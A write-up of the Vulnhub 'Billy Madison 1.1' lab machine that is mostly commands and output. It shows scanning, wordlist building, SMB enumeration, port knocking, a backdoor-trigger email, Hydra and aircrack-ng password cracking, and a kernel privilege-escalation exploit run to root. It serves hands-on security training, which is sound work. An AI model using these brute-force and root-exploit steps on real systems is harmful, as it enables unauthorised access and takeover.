---
layout:     post
title:      "Vulnhub.com - Billy Madison 1.1"
subtitle:   "Write-Up"
date:       2017-03-19 2:00:00
author:     "W3ndige"
header-img: "img/billy-madison-header.jpeg"
category: Vulnhub
---

<h1>Introduction</h1>

<p>Today we're going to try and root another machine from Vulnhub called <a href="https://www.vulnhub.com/entry/billy-madison-11,161/"><b>Billy Madison</b></a>. Our objective is to figure out how Eric took over the machine, undo his changes and recover Billy's 12th grade final project. Sounds great! </p>

<h1>Write-Up</h1>
<h2>Service Discovery</h2>

<p>Our machine was assigned <b>10.0.2.4</b> IP address. Let's fire off an comprehensive Nmap scan to look for attack surface.  </p>

{% highlight bash %}
root@kali:~# nmap -sS -sU -Pn -p- 10.0.2.4

Starting Nmap 7.01 ( https://nmap.org ) at 2017-03-12 11:04 EDT
Nmap scan report for 10.0.2.4
Host is up (0.00084s latency).
Not shown: 65535 open|filtered ports, 65526 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
23/tcp   open   telnet
69/tcp   open   tftp
80/tcp   open   http
137/tcp  closed netbios-ns
138/tcp  closed netbios-dgm
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
2525/tcp open   ms-v-worlds
MAC Address: 08:00:27:2B:54:39 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 209.02 seconds

{% endhighlight %}
<h2>Telnet</h2>
Firstly I tried connecting via <b>ssh</b>, unfortunately without luck. After a few attempts I decided to check out <b>telnet port 23</b>.

{% highlight bash %}
root@kali:~# telnet 10.0.2.4
Trying 10.0.2.4...
Connected to 10.0.2.4.
Escape character is '^]'.


***** HAHAH! You're banned for a while, Billy Boy!  By the way, I caught you trying to hack my wifi - but the joke's on you! I don't use ROTten passwords like rkfpuzrahngvat anymore! Madison Hotels is as good as MINE!!!! *****

Connection closed by foreign host.
{% endhighlight %}

<p>False alarm? After a while of thinking I can see a small clue in the second part of the message - <b>ROT</b> and <b>rkfpuzrahngvat</b>. ROT13 encryption? Yes! After decrypting the string we got this word - <b>exschmenuating</b>.</p>

<p>Unluckily, now I have no idea how to use it, so let's just note that for later. </p>

{% highlight bash %}
root@kali:~# ncat -v 192.168.110.105 23
Ncat: Version 7.25BETA1 ( https://nmap.org/ncat )
Ncat: Connection refused.
{% endhighlight %}

<p>In addition it seems that we are banned from telnet.</p>

<h2>Website - port 80</h2>

<p>We can move on to the potential website running at port <b>80</b>. </p>

![Billy's Website](/img/billy-madison/billy-website.png){:class="img-responsive center-block"}

<p>Unfortunately I don't see anything useful here, apart from random quotes coming from <i>Billy Madison</i> film. Maybe <b>Nikto</b> will tell us something more useful?</p>

{% highlight bash %}
root@kali:~# nikto -h 10.0.2.4
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.4
+ Target Hostname:    10.0.2.4
+ Target Port:        80
+ Start Time:         2017-03-12 16:04:42 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ Server leaks inodes via ETags, header found with file /manual/, fields: 0x272 0x537ae56951000
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7535 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2017-03-12 16:05:04 (GMT-4) (22 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

{% endhighlight %}

<p>No clues, and nothing hidden in the page, or the headers. Luckily we have plenty of other ports open in this machine. </p>

<h2>Wordpress - port 69</h2>

<p>Next move is to check port <b>69</b>, which is running <b>http</b> service. Another website? </p>

![Billy's WordPress Blog](/img/billy-madison/billy-wordpress.png){:class="img-responsive center-block"}

<p>Wow, an old school WordPress 1.0. Let's run another portion of scans. Firstly <b>Nikto</b>.</p>

{% highlight bash %}
root@kali:~# nikto -h 10.0.2.4 -port 69
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.4
+ Target Hostname:    10.0.2.4
+ Target Port:        69
+ Start Time:         2017-03-12 16:14:20 (GMT-4)
---------------------------------------------------------------------------
+ Server: MadisonHotelsWordpress
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS
+ OSVDB-3092: /xmlrpc.php: xmlrpc.php was found.
+ /readme.html: This WordPress file reveals the installed version.
+ /wp-login.php: Wordpress login found
+ /wp-content/plugins/gravityforms/change_log.txt: Gravity forms is installed. Based on the version number in the changelog, it is vulnerable to an authenticated SQL injection. https://wpvulndb.com/vulnerabilities/7849
+ 7551 requests: 13 error(s) and 8 item(s) reported on remote host
+ End Time:           2017-03-12 16:13:55 (GMT-4) (26 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
{% endhighlight %}

<p>Maybe <b>WPScan</b>?</p>

{% highlight bash %}
root@kali:~# wpscan --url 10.0.2.4:69
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __  
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

The plugins directory 'wp-content/plugins' does not exist.
You can specify one per command line option (don't forget to include the wp-content directory if needed)
[?] Continue? [Y]es [N]o, default: [N]
Y
[+] URL: http://10.0.2.4:69/
[+] Started: Sun Mar 12 16:17:13 2017

[!] The WordPress 'http://10.0.2.4:69/readme.html' file exists exposing a version number
[+] Interesting header: SERVER: MadisonHotelsWordpress
[+] XML-RPC Interface available under: http://10.0.2.4:69/xmlrpc.php

[+] WordPress version 1.0 identified from meta generator

[+] WordPress theme in use: twentyeleven

[+] Name: twentyeleven
 |  Latest version: 2.5
 |  Location: http://10.0.2.4:69/wp-content/themes/twentyeleven/
 |  Readme: http://10.0.2.4:69/wp-content/themes/twentyeleven/readme.txt
 |  Changelog: http://10.0.2.4:69/wp-content/themes/twentyeleven/changelog.txt
 |  Style URL: http://10.0.2.4:69/wp-content/themes/twentyeleven/style.css
 |  Referenced style.css: http://10.0.2.4:69/static/wp-content/themes/twentyeleven/style.css
 |  Description:

[+] Enumerating plugins from passive detection ...
[+] No plugins found

[+] Finished: Sun Mar 12 16:17:13 2017
[+] Requests Done: 36
[+] Memory used: 6.344 MB
[+] Elapsed time: 00:00:00
{% endhighlight %}

<p>No luck here, I don't even think that WPScan is working against such an old version of WordPress. </p>

<h2>Exschmenuating?</h2>

<p>After a while of thinking I've found that there is additional page in Billy's website - <b>http://10.0.2.4/exschmenuating/</b>. Maybe we'll get more clues on this one? </p>

![Billy's Exschmenuating Subpage](/img/billy-madison/billy-exschmenuating.png){:class="img-responsive center-block"}

<p>Journal? Firstly let's take a look at <b>Log monitor</b>, then we'll come back to its content. </p>

{% highlight html %}
---
2017-03-12-15-35-01
Hosts currently banned
Chain INPUT (policy DROP)
DROP       all  --  10.0.2.15            anywhere
---
If your IP appears in this list it has been banned, and you will need to reset this host to lift the ban. Otherwise, further efforts to connect to this host may produce false positives or refuse connections altogether.
---
{% endhighlight %}

<p>Now let's reset our machine and once again take a look at the log. </p>

{% highlight bash %}
---
2017-03-12-15-38-01
Hosts currently banned
Chain INPUT (policy DROP)
---
If your IP appears in this list it has been banned, and you will need to reset this host to lift the ban. Otherwise, further efforts to connect to this host may produce false positives or refuse connections altogether.
---
{% endhighlight %}

<p>After connecting a few facts I've noticed that the log was showing entries banned from <b>telnet</b>.</p>

<p>But we have another clue, in the <b>08/03/16</b> part of a page saying: </p>
<p><i>I .captured the whole thing in this folder for later lulz. I put 'veronica' somewhere in the file name</i> </p>

<h2>veronica.cap</h2>

<p>Is it some <b>.cap</b> file? With <b>veronica</b> in file name? Let's prepare for <b>dirbuster</b> by firstly creating an wordlist. I'm going to use rockyou.txt file, but only with grepped <b>veronica</b>. </p>

{% highlight bash %}
root@kali:/usr/share/wordlists# cat rockyou.txt | grep "veronica" > veronica.txt
{% endhighlight %}

<p>And now we're ready to run dirbuster. </p>

![Dirbuster](/img/billy-madison/billy-dirbuster.png){:class="img-responsive center-block"}

<p>Awesome, we have found a file! It's another <b>.cap</b> file, this time it contains email conversation between Veronica and Eric. </p>

{% highlight text %}
MAIL FROM:<eric@madisonhotels.com>
RCPT TO:<vvaughn@polyfector.edu>
DATA
Date: Sat, 20 Aug 2016 21:56:50 -0500
To: vvaughn@polyfector.edu
From: eric@madisonhotels.com
Subject: VIRUS ALERT!
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/

Hey Veronica,

Eric Gordon here.  

I know you use Billy's machine more than he does, so I wanted to let you know that the company is rolling out a new antivirus program for all work-from-home users.  Just <a href="http://areallyreallybad.malware.edu.org.ru/f3fs0azjf.php">click here</a> to install it, k?  

Thanks. -Eric


.
QUIT

EHLO kali
MAIL FROM:<vvaughn@polyfector.edu>
RCPT TO:<eric@madisonhotels.com>
DATA
Date: Sat, 20 Aug 2016 21:57:00 -0500
To: eric@madisonhotels.com
From: vvaughn@polyfector.edu
Subject: test Sat, 20 Aug 2016 21:57:00 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
RE: VIRUS ALERT!

Eric,

Thanks for your message. I tried to download that file but my antivirus blocked it.

Could you just upload it directly to us via FTP?  We keep FTP turned off unless someone connects with the "Spanish Armada" combo.

https://www.youtube.com/watch?v=z5YU7JwVy7s

-VV


.
QUIT

EHLO kali
MAIL FROM:<eric@madisonhotels.com>
RCPT TO:<vvaughn@polyfector.edu>
DATA
Date: Sat, 20 Aug 2016 21:57:11 -0500
To: vvaughn@polyfector.edu
From: eric@madisonhotels.com
Subject: test Sat, 20 Aug 2016 21:57:11 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
RE[2]: VIRUS ALERT!

Veronica,

Thanks that will be perfect.  Please set me up an account with username of "eric" and password "ericdoesntdrinkhisownpee".

-Eric


.
QUIT

EHLO kali
MAIL FROM:<vvaughn@polyfector.edu>
RCPT TO:<eric@madisonhotels.com>
DATA
Date: Sat, 20 Aug 2016 21:57:21 -0500
To: eric@madisonhotels.com
From: vvaughn@polyfector.edu
Subject: test Sat, 20 Aug 2016 21:57:21 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
RE[3]: VIRUS ALERT!

Eric,

Done.

-V


.
QUIT

EHLO kali
MAIL FROM:<eric@madisonhotels.com>
RCPT TO:<vvaughn@polyfector.edu>
DATA
Date: Sat, 20 Aug 2016 21:57:31 -0500
To: vvaughn@polyfector.edu
From: eric@madisonhotels.com
Subject: test Sat, 20 Aug 2016 21:57:31 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
RE[4]: VIRUS ALERT!

Veronica,

Great, the file is uploaded to the FTP server, please go to a terminal and run the file with your account - the install will be automatic and you won't get any pop-ups or anything like that.  Thanks!

-Eric


.
QUIT

EHLO kali
MAIL FROM:<vvaughn@polyfector.edu>
RCPT TO:<eric@madisonhotels.com>
DATA
Date: Sat, 20 Aug 2016 21:57:41 -0500
To: eric@madisonhotels.com
From: vvaughn@polyfector.edu
Subject: test Sat, 20 Aug 2016 21:57:41 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
RE[5]: VIRUS ALERT!

Eric,

I clicked the link and now this computer is acting really weird.  The antivirus program is popping up alerts, my mouse started to move on its own, my background changed color and other weird stuff.  I'm going to send this email to you and then shut the computer down.  I have some important files I'm worried about, and Billy's working on his big 12th grade final.  I don't want anything to happen to that!

-V


.
QUIT
{% endhighlight %}

<h2>Port knocking, SMB and ftp</h2>

<p>Wow, that's some solid portion of clues. Let's list what we know. </p>

<p>We have credentials to ftp <b>eric</b> with password <b>ericdoesntdrinkhisownpee</b>. But what is this <b>Spanish Armada combo</b>? Some secret code? I'll come back to it later.</p>

<p>For now we can move to other ports - especially <b>SMB</b> running on ports <b>139</b> and <b>445</b>. We can firstly check if there are any shares available on the target.</p>

{% highlight bash %}
root@kali:~# smbclient -L 10.0.2.4
Enter root's password:
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]

	Sharename       Type      Comment
	---------       ----      -------
	EricsSecretStuff Disk      
	IPC$            IPC       IPC Service (BM)
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]

	Server               Comment
	---------            -------
	BM                   BM

	Workgroup            Master
	---------            -------
	WORKGROUP            BM

{% endhighlight %}

<p>Great, now we can see if we can connect, and also try to download all of the files stored in the share. </p>

{% highlight bash %}
root@kali:~# smbclient //10.0.2.4/EricsSecretStuff
Enter root's password:
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]
smb: \> ls -la
NT_STATUS_NO_SUCH_FILE listing \-la
smb: \> ls
  .                                   D        0  Sun Mar 12 16:37:40 2017
  ..                                  D        0  Sat Aug 20 14:56:45 2016
  ._.DS_Store                        AH     4096  Wed Aug 17 10:32:07 2016
  ebd.txt                             N       35  Sun Mar 12 16:37:40 2017
  .DS_Store                          AH     6148  Wed Aug 17 10:32:12 2016

		59164 blocks of size 524288. 49861 blocks available
smb: \> get ebd.txt
getting file \ebd.txt of size 35 as ebd.txt (4.9 KiloBytes/sec) (average 4.9 KiloBytes/sec)
smb: \> get ._.DS_Store
getting file \._.DS_Store of size 4096 as ._.DS_Store (1333.3 KiloBytes/sec) (average 403.4 KiloBytes/sec)
smb: \> get .DS_Store
getting file \.DS_Store of size 6148 as .DS_Store (750.5 KiloBytes/sec) (average 557.7 KiloBytes/sec)

{% endhighlight %}

<p>Ok, now let's view what <b>edb.txt</b> has inside. </p>

![EDB Note](/img/billy-madison/billy-edb.png){:class="img-responsive center-block"}

<p>Hmmm, some kind of backdoor? Unfortunately this information won't tell us anything so let's keep it in mind for later. </p>

<p>After quite a lot of time connecting all known facts, especially after watching <a href="https://www.youtube.com/watch?v=z5YU7JwVy7s"><b>this video</b></a>, I've figured out that these dates look like a <b>port knocking sequence</b>. We can try to knock using this simple bash script. </p>

{% highlight bash %}
root@kali:~# for x in 1466 67 1469 1514 1981 1986 1588; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.0.2.4; done

Starting Nmap 7.01 ( https://nmap.org ) at 2017-03-13 13:57 EDT
Warning: 10.0.2.4 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.0.2.4
Host is up (0.00058s latency).
PORT     STATE    SERVICE
1466/tcp filtered oceansoft-lm
MAC Address: 08:00:27:2B:54:39 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds

Starting Nmap 7.01 ( https://nmap.org ) at 2017-03-13 13:57 EDT
Warning: 10.0.2.4 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.0.2.4
Host is up (0.00048s latency).
PORT   STATE    SERVICE
67/tcp filtered dhcps
MAC Address: 08:00:27:2B:54:39 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds

Starting Nmap 7.01 ( https://nmap.org ) at 2017-03-13 13:57 EDT
Warning: 10.0.2.4 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.0.2.4
Host is up (0.00031s latency).
PORT     STATE    SERVICE
1469/tcp filtered aal-lm
MAC Address: 08:00:27:2B:54:39 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds

Starting Nmap 7.01 ( https://nmap.org ) at 2017-03-13 13:57 EDT
Warning: 10.0.2.4 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.0.2.4
Host is up (0.00047s latency).
PORT     STATE    SERVICE
1514/tcp filtered unknown
MAC Address: 08:00:27:2B:54:39 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds

Starting Nmap 7.01 ( https://nmap.org ) at 2017-03-13 13:57 EDT
Warning: 10.0.2.4 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.0.2.4
Host is up (0.00074s latency).
PORT     STATE    SERVICE
1981/tcp filtered p2pq
MAC Address: 08:00:27:2B:54:39 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds

Starting Nmap 7.01 ( https://nmap.org ) at 2017-03-13 13:57 EDT
Warning: 10.0.2.4 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.0.2.4
Host is up (0.00060s latency).
PORT     STATE    SERVICE
1986/tcp filtered licensedaemon
MAC Address: 08:00:27:2B:54:39 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds

Starting Nmap 7.01 ( https://nmap.org ) at 2017-03-13 13:57 EDT
Warning: 10.0.2.4 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.0.2.4
Host is up (0.00039s latency).
PORT     STATE    SERVICE
1588/tcp filtered unknown
MAC Address: 08:00:27:2B:54:39 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds

{% endhighlight %}

<p>Now let's connect to <b>ftp</b>, will this work?</p>

{% highlight bash %}
root@kali:~# ftp 10.0.2.4
Connected to 10.0.2.4.
220 Welcome to ColoradoFTP - the open source FTP server (www.coldcore.com)
Name (10.0.2.4:root): eric
331 User name okay, need password.
Password:
230 User logged in, proceed.
Remote system type is UNIX.
ftp> ls
200 PORT command successful.
150 Opening A mode data connection for /.
-rwxrwxrwx 1 ftp 5367 Aug 20 12:49 39772
-rwxrwxrwx 1 ftp 1287 Aug 20 12:49 9129
-rwxrwxrwx 1 ftp 868 Sep 01 10:42 .notes
-rwxrwxrwx 1 ftp 6326 Aug 20 12:49 40049
-rwxrwxrwx 1 ftp 9132 Aug 20 12:49 40054
-rwxrwxrwx 1 ftp 5208 Aug 20 12:49 39773
226 Transfer completed.

{% endhighlight %}

<p>Great, we have access! I logged using previously known eric password credentials. We have some interesting files, but in the beginning, let's view <b>.notes</b>. </p>

{% highlight bash %}
root@kali:~/Documents# cat .notes
Ugh, this is frustrating.  

I managed to make a system account for myself. I also managed to hide Billy's paper
where he'll never find it.  However, now I can't find it either :-(.
To make matters worse, my privesc exploits aren't working.  
One sort of worked, but I think I have it installed all backwards.

If I'm going to maintain total control of Billy's miserable life (or what's left of it)
I need to root the box and find that paper!

Fortunately, my SSH backdoor into the system IS working.  
All I need to do is send an email that includes
the text: "My kid will be a ________ _________"

Hint: https://www.youtube.com/watch?v=6u7RsW5SAgs

The new secret port will be open and then I can login from there with my wifi password, which I'm
sure Billy or Veronica know.  I didn't see it in Billy's FTP folders, but didn't have time to
check Veronica's.

-EG

{% endhighlight %}

<h2>Backdoor</h2>

<p>Another cryptic riddle? This time it was a lot easier, since we can hear phrase <b>My kid will be a soccer player</b> in the video. We can now send an email using <b>swaks</b>. But to which port? </p>

<p>By looking once again at .cap file we can see this line: </p>

{% highlight bash %}
Transmission Control Protocol, Src Port: 42278 (42278), Dst Port: 2525 (2525), Seq: 12, Ack: 78, Len: 36
{% endhighlight %}

<p>Destination port <b>2525</b>. Let's construct this email! </p>

{% highlight bash %}
root@kali:~# swaks --to eric@madisonhotels.com --from vvaughn@polyfector.edu --server 10.0.2.4:2525 --body "My kid will be a soccer player" --header "Subject: My kid will be a soccer player"
=== Trying 10.0.2.4:2525...
=== Connected to 10.0.2.4.
<-  220 BM ESMTP SubEthaSMTP null
 -> EHLO kali
<-  250-BM
<-  250-8BITMIME
<-  250-AUTH LOGIN
<-  250 Ok
 -> MAIL FROM:<vvaughn@polyfector.edu>
<-  250 Ok
 -> RCPT TO:<eric@madisonhotels.com>
<-  250 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Mon, 13 Mar 2017 15:08:57 -0400
 -> To: eric@madisonhotels.com
 -> From: vvaughn@polyfector.edu
 -> Subject: My kid will be a soccer player
 -> X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
 ->
 -> My kid will be a soccer player
 ->
 -> .
<-  250 Ok
 -> QUIT
<-  221 Bye
=== Connection closed with remote host.

{% endhighlight %}

<h2>SSH</h2>

<p>Hmmm, something happened for certain. But what? I run another <b>Nmap</b> scan, and see that there is new port open at <b>1974</b> - running <b>ssh</b> service. </p>

{% highlight bash %}
PORT     STATE  SERVICE
22/tcp   open   ssh
23/tcp   open   telnet
69/tcp   open   tftp
80/tcp   open   http
137/tcp  closed netbios-ns
138/tcp  closed netbios-dgm
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
1974/tcp open   drp
2525/tcp open   ms-v-worlds
{% endhighlight %}

<p>Reading back through the hints, we can see that there should be account named <b>Veronica</b> in ftp. We can crack the password using <b>Hydra</b> and previously created wordlist.</p>

{% highlight bash %}
root@kali:~# hydra -t 10 -l veronica -P veronica.txt 10.0.2.4 ftp
Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-03-13 15:18:59
[DATA] max 10 tasks per 1 server, overall 64 tasks, 773 login tries (l:1/p:773), ~1 try per task
[DATA] attacking service ftp on port 21
[21][ftp] host: 10.0.2.4   login: veronica   password: babygirl_veronica07@yahoo.com
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-03-13 15:19:15
{% endhighlight %}

<p>Great, we have the password! Now let's log in to ftp, maybe we'll find something useful?</p>

{% highlight bash %}
root@kali:~/Documents# cat email-from-billy.eml
        Sat, 20 Aug 2016 12:55:45 -0500 (CDT)
Date: Sat, 20 Aug 2016 12:55:40 -0500
To: vvaughn@polyfector.edu
From: billy@madisonhotels.com
Subject: test Sat, 20 Aug 2016 12:55:40 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
Eric's wifi

Hey VV,

It's your boy Billy here.  Sorry to leave in the middle of the night but I wanted to crack Eric's wireless and then mess with him.
I wasn't completely successful yet, but at least I got a start.

I didn't walk away without doing my signature move, though.  I left a flaming bag of dog poo on his doorstep. :-)

Kisses,

Billy

{% endhighlight %}

<p>Now we have to crack another password, this time using <b>aircrack-ng</b> tool. I was running some problems, because aircrack could not recognize <b>.cap</b> file but after a little bit of googling I've found that it was due to downloading files in <b>ASCII</b> mode, not in <b>BINARY</b>. </p>


{% highlight bash %}
root@kali:~/Documents# aircrack-ng eg-01.cap -w /usr/share/wordlists/rockyou.txt
[00:27:47] 1699628 keys tested (765.84 k/s))


        KEY FOUND! [ triscuit* ]


Master Key     : 9E 8B 4F E6 CC 5E E2 4C 46 84 D2 AF 59 4B 21 6D
    B5 3B 52 84 04 9D D8 D8 83 67 AF 43 DC 60 CE 92

Transient Key  : 7A FA 82 59 5A 9A 23 6E 8C FB 1D 4B 4D 47 BE 13
    D7 AC AC 4C 81 0F B5 A2 EE 2D 9F CC 8F 05 D2 82
    BF F4 4E AE 4E C9 ED EA 31 37 1E E7 29 10 13 92
    BB 87 8A AE 70 95 F8 62 20 B5 2B 53 8D 0C 5C DC

EAPOL HMAC     : 86 63 53 4B 77 52 82 0C 73 4A FA CA 19 79 05 33
root@kali:~/Documents#

{% endhighlight %}

<p>Now it's working. We also have a password, with which we can log to the <b>ssh</b> service. </p>

{% highlight bash %}
root@kali:~# ssh -p 1974 eric@10.0.2.4
eric@10.0.2.4's password:
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-66-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

110 packages can be updated.
0 updates are security updates.


Last login: Sat Aug 20 22:28:28 2016 from 192.168.3.101
eric@BM:~$ ls -la
total 532
drwxr-xr-x 3 eric eric   4096 Aug 23  2016 .
drwxr-xr-x 6 root root   4096 Aug 20  2016 ..
-rw-r--r-- 1 eric eric    220 Aug 20  2016 .bash_logout
-rw-r--r-- 1 eric eric   3771 Aug 20  2016 .bashrc
drwx------ 2 eric eric   4096 Aug 20  2016 .cache
-rw-r--r-- 1 root root 451085 Aug  7  2016 eric-tongue-animated.gif
-rw-r--r-- 1 root root  60710 Aug  7  2016 eric-unimpressed.jpg
-rw-r--r-- 1 eric eric    655 Aug 20  2016 .profile
-rw-r--r-- 1 root root    115 Aug 20  2016 why-1974.txt
eric@BM:~$ cat why-1974.txt
Why 1974?  Because: http://www.metacafe.com/watch/an-VB9KuJtnh4bn/billy_madison_1995_billy_hangs_out_with_friends/

{% endhighlight %}

<h2>Privilage Escalation</h2>

<p>Some pictures but nothing else... To elevate privilages I decided to give a try this <a href="https://www.exploit-db.com/exploits/40871/"><b>Choco Root</b></a> exploit, created for <b>Linux Kernel 4.4.0</b>. It's using <b>race condition</b> privilage escalation, which I'm going to discuss in one of my future posts. Now let's run it! </p>

{% highlight bash %}
eric@BM:~$ touch chocobo_root.c
eric@BM:~$ nano chocobo_root.c
eric@BM:~$ gcc chocobo_root.c -o chocobo_root -lpthread
eric@BM:~$ ./chocobo_root
linux AF_PACKET race condition exploit by rebel
kernel version: 4.4.0-36-generic #55
proc_dostring = 0xffffffff81087ea0
modprobe_path = 0xffffffff81e48f80
register_sysctl_table = 0xffffffff81286e50
set_memory_rw = 0xffffffff8106f360
exploit starting
making vsyscall page writable..

new exploit attempt starting, jumping to 0xffffffff8106f360, arg=0xffffffffff600000
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 81561, last val = 0)
current packet version = 2
pbd->hdr.bh1.offset_to_first_pkt = 48
race not won

retrying stage..
new exploit attempt starting, jumping to 0xffffffff8106f360, arg=0xffffffffff600000
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 163931, last val = 0)
current packet version = 2
pbd->hdr.bh1.offset_to_first_pkt = 48
race not won

retrying stage..
new exploit attempt starting, jumping to 0xffffffff8106f360, arg=0xffffffffff600000
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 221473, last val = 2)
current packet version = 0
pbd->hdr.bh1.offset_to_first_pkt = 48
*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*
please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so dont do that.
closing socket and verifying.......
vsyscall page altered!


stage 1 completed
registering new sysctl..

new exploit attempt starting, jumping to 0xffffffff81286e50, arg=0xffffffffff600850
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 66563, last val = 0)
current packet version = 2
pbd->hdr.bh1.offset_to_first_pkt = 0
race not won

retrying stage..
new exploit attempt starting, jumping to 0xffffffff81286e50, arg=0xffffffffff600850
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 143274, last val = 0)
current packet version = 2
pbd->hdr.bh1.offset_to_first_pkt = 48
race not won

retrying stage..
new exploit attempt starting, jumping to 0xffffffff81286e50, arg=0xffffffffff600850
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 158827, last val = 2)
current packet version = 0
pbd->hdr.bh1.offset_to_first_pkt = 0
race not won

retrying stage..
new exploit attempt starting, jumping to 0xffffffff81286e50, arg=0xffffffffff600850
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 99401, last val = 2)
current packet version = 0
pbd->hdr.bh1.offset_to_first_pkt = 48
*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*
please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so dont do that.
closing socket and verifying.......
sysctl added!

stage 2 completed
binary executed by kernel, launching rootshell
root@BM:~# whoami
root
root@BM:~#

{% endhighlight %}

<p>Great, it's working! Now it's time to look for the last flag. </p>

{% highlight bash %}
root@BM:/home/billy# ls
billy-shampoo-animated.gif  billy-shampoo.jpg  billy-smartestmanalive.gif  pics
root@BM:/home/billy#
{% endhighlight %}

<p>It's definitely not here, altough there's another portion of pictures. </p>

![Eric unimpressed](/img/billy-madison/eric-unimpressed.jpg){:class="img-responsive center-block"}

<p>Let's keep looking. </p>

{% highlight bash %}
root@BM:/# cd /
root@BM:/# ls -la
total 105
drwxr-xr-x  25 root root  4096 Mar 14 15:13 .
drwxr-xr-x  25 root root  4096 Mar 14 15:13 ..
drwxr-xr-x   2 root root  4096 Mar 14 15:11 bin
drwxr-xr-x   4 root root  1024 Mar 14 15:14 boot
drwxr-xr-x   2 root root  4096 Aug 18  2016 capture
drwxr-xr-x  20 root root  4220 Mar 14 15:06 dev
drwxr-xr-x 105 root root  4096 Mar 14 15:14 etc
drwxr-xr-x   6 root root  4096 Aug 20  2016 home
lrwxrwxrwx   1 root root    32 Mar 14 15:13 initrd.img -> boot/initrd.img-4.4.0-66-generic
lrwxrwxrwx   1 root root    32 Aug 30  2016 initrd.img.old -> boot/initrd.img-4.4.0-36-generic
drwxr-xr-x  23 root root  4096 Aug 16  2016 lib
drwxr-xr-x   2 root root  4096 Aug  5  2016 lib64
-rw-r--r--   1 root root   520 Aug 20  2016 log.txt
drwx------   2 root root 16384 Aug  5  2016 lost+found
drwxr-xr-x   3 root root  4096 Aug  5  2016 media
